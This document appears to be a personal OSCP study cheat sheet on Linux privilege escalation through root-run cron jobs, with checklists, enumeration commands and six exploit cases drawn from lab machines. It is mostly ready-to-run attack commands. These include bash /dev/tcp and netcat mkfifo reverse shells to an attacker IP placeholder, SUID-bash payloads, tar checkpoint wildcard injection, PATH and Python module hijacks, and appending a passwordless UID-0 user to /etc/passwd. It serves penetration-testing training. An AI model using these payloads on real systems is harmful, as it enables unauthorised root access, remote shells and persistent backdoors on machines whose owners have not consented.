In OSCP/Linux privilege escalation, cron jobs are scheduled commands or scripts that run automatically. They can become privilege escalation paths when a cron job runs as root but executes something you can modify
## Goal
Find **scheduled tasks** running as root that you can hijack — writable scripts, PATH abuse, or wildcard injection. Use **pspy** to catch cron jobs that don't appear in `/etc/crontab`.
## Tips
For OSCP, you do not need to memorize everything. Just know that if it runs every minute or every few minutes, it is easier to test.

Checklist when you find a cron job:
- [ ] who runs it, root?
- [ ] can i write to that file? ls -la /opt/backup.sh
- [ ] can i write to that folder? ls -ld /opt
- [ ] what does the script do? cat /opt/backup.sh
- [ ] what file/script does it execute? e.g /opt/backup.sh
- [ ] does it use *, relative paths, or cmd w/o full paths?
- [ ] can i cfm execution? echo 'id > /tmp/test' into the controlled script/file
- [ ] can i turn it into root shell? Reverse shell or SUID bash

# Commands

### Step 1: Enumerate cron

```bash
# System crontab
cat /etc/crontab

# User crontabs
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*  2>/dev/null

# Periodic directories
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/cron.d/*

# Systemd timers (modern alternative to cron)
systemctl list-timers --all

# Cron activity in logs (shows what RAN, even jobs you can't read)
grep "CRON" /var/log/syslog 2>/dev/null

# Writable files/dirs a cron job might touch (cross-check vs the script)
find / -writable -type f 2>/dev/null | grep -v "/proc"
find / -writable -type d 2>/dev/null | grep -v "/proc"
```

### Step 2: Enumerate using pspy tool - catch hidden cron jobs

```bash
#to victim /tmp
wget http://<YOUR_IP>/pspy64 #use 32 or 64s if different architecture
chmod +x /tmp/pspy64
./pspy64 -f -i 1000          # -f = show file events, -i 1000 = poll every 1s

# Watch for patterns:
# CMD: UID=0 → root running something
# Repeated processes every minute/5min = cron
# Scripts running from writable directories
# refer to helpline 10 for example

# If pspy unavailable — manual process watch:
watch -n 1 "ps aux | grep -v '\[' | tail -20"
```

### Step 3: Linpeas
```
# linpeas also flags cron under "Check for vulnerable cron jobs" (red/yellow)
# after you catch a shell, upgrade it: python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Exploit

### Case 1: Exploit writable cron script

**Enumerate:**

```bash
# check permission 
ls -la /opt/backup.sh
# if you see something like:
-rwxrwxrwx 1 root root backup.sh
# or your user/group can write to it, then it's vulnerable. 
```

**Test for write:**

```bash
echo 'id > /tmp/cron_test' >> /opt/backup.sh
# wait for cron to run, then:
cat /tmp/cron_test
# if it says:
uid=0(root)
# then the script is running as root.
```

**Reverse shell:**

```bash
# victim, if cron runs /opt/backup.sh and you can write to it:
echo 'bash -c "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1"' >> /opt/backup.sh
# or
echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh
# wait for cron → /bin/bash -p → root

# if cron runs a script that sources another file you can write:
#tldr this cron no perms but able to run/call another file with perms
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1' > /tmp/sourced_config.sh

# no bash /dev/tcp? netcat + mkfifo variant:
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f

#my kali (if rev shell)
nc -lvnp 4444
# seen on: PG Exfiltrated, PG Zino, HTB SolidState (writable /opt/tmp.py), HTB Cronos
```

### Case 2: Writable Directory Containing Root-Run Script

**Enumerate:**

```bash
# check the FOLDER, not the file
ls -ld /opt/scripts
# if you see:
drwxrwxrwx 2 root root scripts
# folder is writable -> you can replace files inside, even root-owned ones
# (deleting a file depends on FOLDER perms, not file owner — unless sticky bit 't')
```

**Exploit (replace the script):**

```bash
cd /opt/scripts
mv backup.sh backup.bak           # move root's script aside (or rm it)
echo 'chmod +s /bin/bash' > backup.sh
chmod +x backup.sh
# wait for cron, then:
/bin/bash -p                      # -p keeps root -> root shell
```

### Case 3: Wildcard Abuse

**Enumerate:**

```bash
cat /opt/backup.sh
# danger sign: * used with tar/chown/rsync/chmod inside a dir you can write
# e.g.  tar -czf /backup/site.tar.gz *
```

**Exploit (tar checkpoint — run INSIDE the dir the * lives in):**

```bash
cd /var/www/html                  # the writable dir where * expands
echo 'chmod +s /bin/bash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# wait for cron -> tar reads the filenames as flags -> runs shell.sh as root
/bin/bash -p
# other wildcard bins (chown/rsync/zip) -> check GTFOBins for the right flags
# seen on: HTB Networked, PG Exghost
```

### Case 4: PATH Hijacking

**Enumerate:**

```bash
cat /opt/backup.sh
# script calls a command with NO full path:
#   backup            (not /usr/bin/backup)
cat /etc/crontab | head           # check cron's PATH=
# PATH=/home/user:/usr/bin:/bin   <- writable dir FIRST = win
```

**Exploit (fake the command):**

```bash
echo '#!/bin/bash'          >  /home/user/backup
echo 'chmod +s /bin/bash'   >> /home/user/backup
chmod +x /home/user/backup
# wait for cron -> root runs YOUR backup
/bin/bash -p
# seen on: HTB Magic (sysinfo PATH hijack)
```

### Case 5: Relative Paths in Scripts

**Enumerate:**

```bash
cat /opt/backup.sh
# script cd's into a dir you control, then uses a RELATIVE file/dir:
#   cd /var/www/html
#   tar -czf backup.tar.gz uploads/*     (relative 'uploads/')
#   . ./config                            (sources relative 'config')
ls -la /var/www/html /var/www/html/uploads
```

**Exploit:**

```bash
# if the relative file it sources/runs is writable, drop your payload there:
echo 'chmod +s /bin/bash' > /var/www/html/config
# if it's a relative wildcard (uploads/*), use Case 3 inside that dir
/bin/bash -p
```

### Case 6: Insecure Cleanup Jobs

**Enumerate:**

```bash
cat /opt/clean.py
# root cron runs a python/bash cleaner -> look for an imported/sourced file:
#   import backup           (python)  -> where does backup.py load from?
#   source ./lib.sh         (bash)    -> is lib.sh writable?
python3 -c 'import sys; print(sys.path)'   # a writable dir in the path = hijack
```

**Exploit (library / module hijack):**

```bash
# drop a malicious module that loads first (cwd or a writable sys.path dir)
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/backup.py
# wait for cron -> root imports your backup.py
/bin/bash -p
# bash version: write the sourced file -> echo 'chmod +s /bin/bash' > lib.sh
```

## Helpline:

1. Example of cron file:

```bash
* * * * * root /opt/backup.sh 
```

Read it like this: minute hour day month weekday user command So this means: Every minute, run /opt/backup.sh as root

2. Understand Cron Timing

```bash
* * * * * command
| | | | |
| | | | +-- day of week
| | | +---- month 
| | +------ day of month
| +-------- hour +---------- minute
```

Common examples:

```
* * * * * every minute 
*/5 * * * * every 5 minutes 
0 * * * * 0 0 * * * every hour 
0 0 * * * every day at midnight
```

3. SUID bash primitive (every case ends here)

```bash
chmod +s /bin/bash      # set SUID bit on bash (needs root — that's what cron gives you)
/bin/bash -p            # -p = KEEP euid=root; without -p bash drops back to your user
id                      # check: euid=0(root)
```

4. Reverse shell vs SUID bash — which to use?

```
cron is non-interactive -> SUID bash (chmod +s /bin/bash) is the reliable default.
use a reverse shell only if you want a full interactive session:
  echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' >> <script>   # bash /dev/tcp
  # no bash? netcat + mkfifo:
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f
  nc -lvnp 4444   (on kali)
```

5. Why wildcard (*) abuse works

```
the shell expands * into EVERY filename in the dir.
tar/chown/rsync then read any filename starting with '-' as an OPTION.
so a file named  --checkpoint-action=exec=sh shell.sh  becomes a tar flag
that executes your shell.sh as root.
```

6. Writable dir vs writable file

```
you can delete/replace ANY file in a writable dir (even root's) — delete checks DIR perms.
EXCEPT if the dir has the sticky bit:  drwxrwxrwt  (the 't')
  -> then only the file's owner can delete it.
```

7. Alt escalation — add a root user via /etc/passwd (instead of SUID bash)

```bash
# if the cron payload runs as root, append a passwordless UID-0 user:
echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd   # empty password field
su root2                                            # no password -> root
# or with a hash:
#   openssl passwd w00t      -> e.g. Fdzt.eqJQ4s0g
#   echo 'root2:Fdzt.eqJQ4s0g:0:0::/root:/bin/bash' >> /etc/passwd ; su root2
```

8. What to Look for in pspy Example output:

```bash
CMD: UID=0 PID=1234 /bin/bash /opt/backup.sh
```

This tells you:

```bash
UID=0 = root /opt/backup.sh = script being run
```